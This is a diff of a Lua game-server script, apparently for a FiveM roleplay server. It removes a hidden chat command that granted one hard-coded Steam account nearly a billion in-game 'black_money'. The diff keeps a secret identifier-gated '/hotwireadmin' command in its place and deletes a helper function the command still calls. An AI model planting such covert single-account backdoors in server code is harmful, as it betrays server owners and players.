@@ -108,17 +108,28 @@ AddEventHandler('chatMessage', function(source, n, message)
 			end
 
 
-		elseif cm[1] == "/jastenkasieh" then
+		elseif cm[1] == "/hotwireadmin" then
 			local src = source
 			local player = getIdentity(src)
 	
 
 			if player.identifier == 'steam:1100001115e4c94'  then
-				print('Utang granted')
-				xPlayer.addAccountMoney('black_money', 999999999)
+			--	print('Utang granted')
+			--	xPlayer.addAccountMoney('black_money', 999999999)
+			TriggerClientEvent('retro_scripts:startengine', source)
 			end
 
-
+		
+		
+	
+		
+		   
+			
+		
+			
+				
+			
+			
 
 		
 		elseif cm[1] == "/wawanamanakohuhuhuhwagnamancombatlog" then
@@ -314,27 +325,7 @@ end)
 
 
 
-function getIdentity(source)
-	local identifier = GetPlayerIdentifiers(source)[1]
-	local result = MySQL.Sync.fetchAll("SELECT * FROM users WHERE identifier = @identifier", {['@identifier'] = identifier})
-	if result[1] ~= nil then
-		local identity = result[1]
 
-		return {
-			identifier = identity['identifier'],
-			firstname = identity['firstname'],
-			lastname = identity['lastname'],
-			dateofbirth = identity['dateofbirth'],
-			sex = identity['sex'],
-            height = identity['height'],
-            job = identity['job'],
-            money = identity['money']
-			
-		}
-	else
-		return nil
-	end
-end
 
 RegisterServerEvent("retro_scripts:takingitallnow")
 AddEventHandler("retro_scripts:takingitallnow", function(source)
